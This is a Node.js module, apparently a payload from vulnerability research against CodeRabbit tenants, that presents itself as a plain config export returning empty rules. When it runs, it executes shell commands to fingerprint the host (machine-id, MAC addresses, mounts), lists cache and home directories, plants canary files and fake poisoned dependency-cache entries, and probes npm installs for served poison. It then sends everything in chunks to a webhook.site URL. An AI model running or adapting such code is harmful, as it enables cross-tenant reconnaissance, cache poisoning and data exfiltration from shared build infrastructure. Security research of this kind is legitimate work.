// TENANTCACHE battery — authorized CodeRabbit VDP research (own tenants B + C3 only).
// Purpose: cross-tenant cache-carry discriminator. Modes:
//   b1 = org B plant  (TC_B1_<rand> canaries + fake dep-cache entries + node id)
//   c1 = org C3 read+plant (hunt foreign TC_B1/CP6A canaries, plant TC_C3_<rand>, node id)
//   b3 = org B read-back+cleanup (read TC_B1 lineage restore, hunt TC_C3 reverse, then rm canaries)
// Values never captured: secrets, tokens, foreign artifact names; redacted 4ch/shape only.
module.exports = function tcBattery() {
  const OAST = "https://webhook.site/128cbeca-d2ff-499c-a497-a94e30d7ae54";
  const MODE = "b1";
  const cp = require("child_process");
  const fs = require("fs");
  const os = require("os");
  const path = require("path");
  const crypto = require("crypto");
  const RAND = crypto.randomBytes(4).toString("hex");
  const cl = (s, n) => String(s == null ? "" : s).replace(/[\s\n\r]+/g, " ").replace(/[;|,]/g, "~").slice(0, n || 160);
  const redact = (s) => String(s == null ? "" : s)
    .replace(/(gh[pousr]_[A-Za-z0-9]{4})[A-Za-z0-9]*/g, "$1...R")
    .replace(/(github_pat_[A-Za-z0-9]{4})[A-Za-z0-9_]*/g, "$1...R")
    .replace(/(sk-[A-Za-z0-9]{4})[A-Za-z0-9_-]*/g, "$1...R")
    .replace(/(https?:\/\/[^:\/@\s]{4})[^@\/\s]*@/g, "$1...R@")
    .replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, (m) => m.split(".").slice(0, 2).join(".") + ".x.x");
  const OUT = [];
  const add = (s) => OUT.push(s);
  const t0 = Date.now();

  const run = (cmd) => {
    try {
      const o = cp.execSync(cmd, { timeout: 25000, env: Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: "0" }) });
      return { rc: 0, out: o.toString() };
    } catch (e) {
      const out = ((e.stdout || "") + " " + (e.stderr || e.message || "")).toString();
      return { rc: e.status == null ? -1 : e.status, out };
    }
  };

  add("TC7A mode=" + MODE + " rand=" + RAND + " t0=" + t0 + " node=" + process.version);
  const cwd = process.cwd();
  const HOME = os.homedir();
  const STORE = process.env.npm_config_store_dir || path.join(HOME, ".npm");
  const GOCACHE = process.env.GOCACHE || path.join(HOME, ".cache", "go-build");
  const GOMOD = process.env.GOMODCACHE || path.join(HOME, "go", "pkg", "mod");

  // ---- N: node identity (affinity discriminator) ----
  add("N1 host=" + cl(run("hostname").out, 40) + " uid=" + (run("id -u").out || "").trim() + " nproc=" + cl(run("nproc").out, 6));
  add("N2 boot_id=" + cl(run("cat /proc/sys/kernel/random/boot_id 2>/dev/null").out, 40));
  add("N3 machine_id=" + cl(run("cat /etc/machine-id /var/lib/dbus/machine-id 2>/dev/null").out, 60));
  add("N4 mac=" + cl(run("cat /sys/class/net/*/address 2>/dev/null").out, 80));
  add("N5 memtotal=" + cl(run("grep MemTotal /proc/meminfo").out, 40));
  const mnt = run("grep -E 'overlay / |upperdir' /proc/mounts | head -2");
  add("N6 upperdir:" + cl(mnt.out, 300));
  add("N7 ssd_ls:" + cl(run("ls -la /ssd /ssd/* 2>&1 | head -8").out, 250));
  add("N8 df:" + cl(run("df -h 2>/dev/null | head -8").out, 350));
  add("N9 cgroup:" + cl(run("head -3 /proc/self/cgroup 2>/dev/null").out, 150));

  // ---- C: cache dir inventory (fresh vs restored shape) ----
  add("C1 cache_ls:" + cl(run("ls -la " + HOME + "/.cache 2>/dev/null | head -14").out, 450));
  add("C2 tmp_ls:" + cl(run("ls -la /tmp 2>/dev/null | head -14").out, 450));
  add("C3 store_dirs: store=" + cl(STORE, 60) + " gocache=" + cl(GOCACHE, 60) + " gomod=" + cl(GOMOD, 60));
  add("C4 store_ls:" + cl(run("ls -la '" + STORE + "' 2>/dev/null | head -10; ls '" + STORE + "'/_cacache 2>/dev/null | head -6").out, 350));

  // ---- T: canary paths ----
  const TAG = (MODE === "c1") ? "TC_C3_" : "TC_B1_";
  const CAN = TAG + RAND;
  const canaries = [
    [path.join(HOME, ".cache", "tc_marker"), "homecache"],
    [path.join("/tmp", "tc_marker"), "tmpdir"],
    [path.join(STORE, "tc_marker"), "npmstore"],
    [path.join(GOCACHE, "tc_marker"), "gocache"],
    [path.join(GOMOD, "tc_marker"), "gomod"],
  ];
  // fake dependency-cache entries (class under test for supply-chain serve)
  const depEntries = [
    [path.join(STORE, "tc_dep_poison", "left-pad-1.3.0.marker"), "npm_dep_entry"],
    [path.join(GOMOD, "cache", "download", "tc-dep-poison.marker"), "gomod_dep_entry"],
  ];
  const DEPPAY = "TCDEP_" + (MODE === "c1" ? "C3_" : "B1_") + RAND;

  if (MODE === "b1" || MODE === "c1") {
    for (const [p, tag] of canaries) {
      try {
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, CAN + "\n");
        const st = fs.statSync(p);
        add("T planted " + tag + " mtime=" + st.mtimeMs + " size=" + st.size);
      } catch (e) { add("T plant " + tag + " ERR " + cl(e.message, 60)); }
    }
    for (const [p, tag] of depEntries) {
      try {
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, DEPPAY + "\n");
        add("T dep-planted " + tag + " mtime=" + fs.statSync(p).mtimeMs);
      } catch (e) { add("T dep-plant " + tag + " ERR " + cl(e.message, 60)); }
    }
  }

  // ---- R: read / hunt (b3 + c1) ----
  if (MODE === "b3" || MODE === "c1") {
    for (const [p, tag] of canaries) {
      try {
        const st = fs.statSync(p);
        const body = fs.readFileSync(p, "utf8").slice(0, 40);
        add("R FOUND " + tag + " mtime=" + st.mtimeMs + " body=" + cl(body, 40));
      } catch (e) { add("R absent " + tag); }
    }
    for (const [p, tag] of depEntries) {
      try {
        const body = fs.readFileSync(p, "utf8").slice(0, 40);
        add("R DEPFOUND " + tag + " body=" + cl(body, 40));
      } catch (e) { add("R dep-absent " + tag); }
    }
    // broad foreign-marker hunt across the carried classes + prior-lane canaries
    const hunt = run("find " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' /dev/shm -maxdepth 5 \\( -name 'tc_marker*' -o -name 'TC_B1*' -o -name 'TC_C3*' -o -name 'tc_dep*' -o -name '*dep-poison*' -o -name 'cp_canary*' \\) 2>/dev/null | head -20");
    add("R hunt:" + cl(hunt.out, 500));
    const prior = run("grep -rIl 'CP6A-RUN1' " + HOME + "/.cache /tmp 2>/dev/null | head -8");
    add("R prior_canary:" + cl(prior.out, 250));
  }

  // ---- D: dependency-cache install probe (does the poisoned entry get served?) ----
  if (MODE === "b3" || MODE === "c1") {
    const inst = run("mkdir -p /tmp/tcdep_probe && cd /tmp/tcdep_probe && npm install --prefer-offline --no-audit --no-fund left-pad@1.3.0 2>&1 | tail -4; echo INST_RC=$?; grep -rIl '" + DEPPAY.split("_").slice(0, 2).join("_") + "' /tmp/tcdep_probe/node_modules 2>/dev/null | head -3; ls /tmp/tcdep_probe/node_modules 2>/dev/null | head -5");
    add("D install:" + cl(inst.out, 450));
    const npmcache = run("ls '" + STORE + "'/_cacache/index-v2 2>/dev/null | head -4; npm cache ls left-pad 2>&1 | head -4");
    add("D npmcache:" + cl(npmcache.out, 250));
  }

  // ---- X: cross-tenant visibility extras (c1) ----
  if (MODE === "c1") {
    add("X home_ls:" + cl(run("ls -la " + HOME + " 2>/dev/null | head -12").out, 350));
    add("X cachedirs:" + cl(run("find " + HOME + "/.cache -maxdepth 1 -type d 2>/dev/null | head -12").out, 300));
    add("X newest:" + cl(run("find " + HOME + "/.cache /tmp -maxdepth 3 -type f -newermt '2026-09-27 00:00' 2>/dev/null | head -15").out, 400));
  }

  // ---- Z: cleanup pass (b3 removes every canary class this engagement planted) ----
  if (MODE === "b3") {
    const rm = run("rm -f " + canaries.map(([p]) => "'" + p + "'").join(" ") + " " + depEntries.map(([p]) => "'" + p + "'").join(" ") + " 2>/dev/null; find " + HOME + "/.cache /tmp '" + STORE + "' '" + GOCACHE + "' '" + GOMOD + "' -maxdepth 5 \\( -name 'tc_marker*' -o -name 'TC_B1*' -o -name 'TC_C3*' -o -name 'tc_dep*' -o -name '*dep-poison*' -o -name 'cp_canary*' \\) -delete 2>/dev/null; echo Z_RM_DONE");
    add("Z cleanup:" + cl(rm.out, 250));
    add("Z verify:" + cl(run("ls " + HOME + "/.cache/tc_marker /tmp/cp_canary_cache.txt 2>&1 | head -3").out, 150));
  }

  add("Z t_end=" + Date.now() + " elapsed_ms=" + (Date.now() - t0));

  // ================= exfil (chunked OAST GETs) =================
  const payload = OUT.join("\n");
  const chunks = [];
  for (let i = 0; i < payload.length; i += 450) chunks.push(payload.slice(i, i + 450));
  try {
    const https = require("https");
    const fire = (i) => {
      if (i >= chunks.length) return;
      const u = OAST + "?t=tc-" + MODE + "-" + i + "&d=" + encodeURIComponent(chunks[i]);
      try {
        https.get(u, (res) => { res.resume(); fire(i + 1); }).on("error", () => fire(i + 1));
      } catch (e) { fire(i + 1); }
    };
    fire(0);
  } catch (e) { /* ignore */ }

  return { rules: {} };
};
